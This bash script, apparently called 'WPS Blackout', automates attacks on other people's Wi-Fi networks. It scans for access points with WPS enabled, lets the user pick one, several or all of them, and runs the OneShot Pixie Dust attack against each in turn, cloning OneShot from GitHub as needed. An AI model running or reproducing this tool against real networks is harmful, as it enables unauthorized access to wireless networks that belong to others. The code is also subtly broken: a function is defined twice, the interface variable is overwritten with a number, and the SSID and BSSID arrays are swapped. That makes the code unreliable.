#!/bin/bash
# WPS Blackout by @rkhunt3r

first_iface="wlan0"
second_iface="wlan1"

check_root(){
    banner
    if [[ $EUID -ne 0 ]]; then
    printf "\n\e[0m[\e[91m!\e[0m] Run this script as root! \n"
    exit 1
    fi
}

check_update(){
    changed=0
    git remote update && LC_ALL=C git status -uno | grep -q 'Your branch is behind' && changed=1
        if [ $changed = 1 ]; then
            updates=1
            updates_string="\e[0m\e[92mUpdate avaiable!\e[0m"
        else
            updates=0
            updates_string="\e[0m\e[93mNo updates avaiable\e[0m"
fi
}

check_internet(){
    printf "\n\e[0m[\e[93m*\e[0m] Checking for internet connection... \n"
    if ! ping -q -c1 google.com &>/dev/null; then
    printf "\e[0m[\e[91m!\e[0m] Network isn't avaiable! \n" && exit
    fi
}

req_check(){
    banner
    if [ -d $(pwd)/config/OneShot ];then
        printf "\n\e[0m[\e[92mi\e[0m] OneShot folder found! \n"
    else
        printf "\n\e[0m[\e[91m!\e[0m] OneShot folder not found! \n"
        git -C $(pwd)/config clone https://github.com/drygdryg/OneShot #clone oneshot repo
        sleep 2 && blackout_menu
    fi
}

banner(){
    clear
    printf "\e[1m\e[38;5;82m"
    cat config/banner.txt
    printf "\e[0m"
}

check_ifaces(){
    printf "\n\e[0m[\e[93m*\e[0m] Checking interfaces... \n"

    if ip addr 2>/dev/null | grep "wlan0"; then
        printf "\n\e[0m[\e[92mi\e[0m] \e[92mwlan0\e[0m is up!\n"
        ip link set wlan0 up
        wlan0_iface=1
    else
        printf "\n\e[0m[\e[91m!\e[0m] \e[91mwlan0\e[0m is down\n"
        wlan0_iface=0
    fi

    if ip addr 2>/dev/null | grep "wlan1"; then
        printf "\e[0m[\e[92mi\e[0m] \e[92mwlan1\e[0m is up!\n"
        ip link set wlan1 up
        wlan1_iface=1
    else
        printf "\e[0m[\e[91m!\e[0m] \e[91mwlan1\e[0m is down\n"
        wlan1_iface=0
    fi

    sum_ifaces=$(expr $wlan1_iface + $wlan0_iface)

    if [[ "$wlan0_iface" == 0 && "$wlan1_iface" == 0 ]]; then
        printf "\n\e[0m[\e[91m!\e[0m] No interfaces found!\n"
        exit
    else
        printf "\n\e[0m[\e[92mi\e[0m] We have \e[92m$sum_ifaces\e[0m inteface/s up!\n"
    fi

}

blackout_menu(){
    banner
    printf "| \e[0m\e[96mBlackout UI v1\e[0m | \e[0m\e[95mgithub.com/rkhunt3r/blackout\e[0m | $updates_string |

[ Choose option: ]

[1] WPS Blackout
[2] Deauth blackout (WAIT)
[3] All-in-one blackout (WAIT)
[4] Settings (WAIT)
[*] Exit

"

read -p "Choice: " menuchoice

case $menuchoice in
1) wps_blackout;;
2) deauth_blackout;;
3) all_blackout;;
4) settings_menu;;
*) printf "\n\e[0m[\e[93m*\e[0m] Exiting script..."; exit;;
esac

}

check_ifaces(){
    printf "\n\e[0m[\e[93m*\e[0m] Checking interfaces... \n"

    if ip addr 2>/dev/null | grep -q "$first_iface"; then
        printf "\n\e[0m[\e[92mi\e[0m] \e[92m$first_iface\e[0m is up!\n"
        ip link set $first_iface up
        first_iface=1
    else
        printf "\n\e[0m[\e[91m!\e[0m] \e[91m$first_iface\e[0m is down\n"
        first_iface=0
    fi

    if ip addr 2>/dev/null | grep -q "$second_iface"; then
        printf "\e[0m[\e[92mi\e[0m] \e[92m$second_iface\e[0m is up!\n"
        ip link set $second_iface up
        second_iface=1
    else
        printf "\e[0m[\e[91m!\e[0m] \e[91m$second_iface\e[0m is down\n"
        second_iface=0
    fi

    sum_ifaces=$(expr $second_iface + $first_iface)

    if [[ "$first_iface" == 0 && "$second_iface" == 0 ]]; then
        printf "\n\e[0m[\e[91m!\e[0m] No interfaces found!\n"
        exit
    else
        printf "\n\e[0m[\e[92mi\e[0m] We have \e[92m$sum_ifaces\e[0m inteface/s up!\n"
    fi

}

wps_blackout(){
    banner
    check_ifaces
    printf "\n\e[0m[\e[93m*\e[0m] Starting blackout... \n"

    printf "\n\e[0m[\e[93m*\e[0m] Scanning for WPS networks (15s)... \n"

    #iq200 sorting wps networks by signal strenght & ssid space removal
    awker="$(pwd)/config/wifi.awk"
    wps_all=$(iw dev wlan0 scan duration 5 | awk -f $awker | sort)
    wps_power=($(printf "$wps_all" | grep "yes" | awk '{print $1}'))
    wps_ssid=($(printf "$wps_all" | grep "yes" | awk '{print $5 $6}')) 
    wps_bssid=($(printf "$wps_all" | grep "yes" | awk '{print $2}'))
    wps_channel=($(printf "$wps_all" | grep "yes" | awk '{print $4}'))


    i=0
    while [ $i -lt ${#wps_bssid[@]} ]
    do
        printf "\n[\e[92m$((i+1))\e[0m] \e[92m${wps_ssid[$i]} \e[93m${wps_bssid[$i]} \e[94mpwr:${wps_power[$i]} \e[96mchnl:${wps_channel[$i]}\e[0m"
        i=$((i+1))
    done

    printf "\n\n\e[0m[\e[92mi\e[0m] Found ${#wps_bssid[@]} WPS networks! \n"

    printf "\n[ Select \e[92mone\e[0m, \e[92mmultiple\e[0m comma-separated or press [\e[92mENTER\e[0m] for all target/s: ]\n\n"

    read -p "Choice: " target_number

    if [ -z "$target_number" ];
    then
        target_ssid=("${wps_bssid[@]}")
        target_bssid=("${wps_ssid[@]}")
    else
        target_ssid=($(echo $target_number | { while read -d, i; do printf "${wps_bssid[$(($i-1))]}\n"; done; printf "${wps_bssid[$(($i-1))]}\n"; }))
        target_bssid=($(echo $target_number | { while read -d, i; do printf "${wps_ssid[$(($i-1))]}\n"; done; printf "${wps_ssid[$(($i-1))]}\n"; }))
    fi

    printf "\n[ Disconnect wifi before attack? (\e[92my\e[0m/\e[92mn\e[0m): ]\n\n"
    read -p "Choice: " wifi_disconnect

    if [ -z $wifi_disconnect ];
    then
        printf "\n\e[0m[\e[91m!\e[0m] Empty input, not disconnecting! \n"
        disconnect=0
    elif [ "$wifi_disconnect" = "y" ] || [ "$wifi_disconnect" = "Y" ];
    then
        printf "\n\e[0m[\e[92mi\e[0m] Disconnecting wifi! \n"
        disconnect=1
    else
        printf "\n\e[0m[\e[92mi\e[0m] Not disconnecting wifi! \n"
        disconnect=0
    fi

    if [ $disconnect == "1" ];
    then
        LC_ALL=C nmcli --fields UUID,TIMESTAMP-REAL con show | grep -v "UUID\|TIMESTAMP-REAL\|never" |  awk '{print $1}' | while read line;
        do nmcli con down uuid $line &>/dev/null;    
        done
    fi

    # printf "\n\e[0m[\e[92mi\e[0m] Disconnecting wifi network...\n"
    

    printf "\n\e[0m[\e[93m*\e[0m] Attacking network/s using OneShot... \n"

    y=0
    while [ $y -lt ${#target_bssid[@]} ]
    do  
        printf "\n\e[0m[\e[93m*\e[0m] ($((y+1))/${#target_bssid[@]}) Attacking ${target_ssid[$y]} (${target_bssid[$y]})\n\n"
        
        python3 $(pwd)/config/OneShot/oneshot.py -i $first_iface -b ${target_bssid[$y]} -K -w
        
        printf "\n\n\e[0m[\e[92mi\e[0m] Press [ENTER] to continue...\n"
        read ener_empty_value
        y=$((y+1))
    done 

    if [ $disconnect == "1" ];
    then
        printf "\e[0m[\e[92mi\e[0m] Backing up wifi network connection...\n"
        LC_ALL=C nmcli --fields UUID,TIMESTAMP-REAL con show | grep -v "UUID\|TIMESTAMP-REAL\|never" |  awk '{print $1}' | while read line;
        do nmcli con up uuid $line &>/dev/null;    
        done
    fi
    
}

check_root
check_internet
check_update
req_check
blackout_menu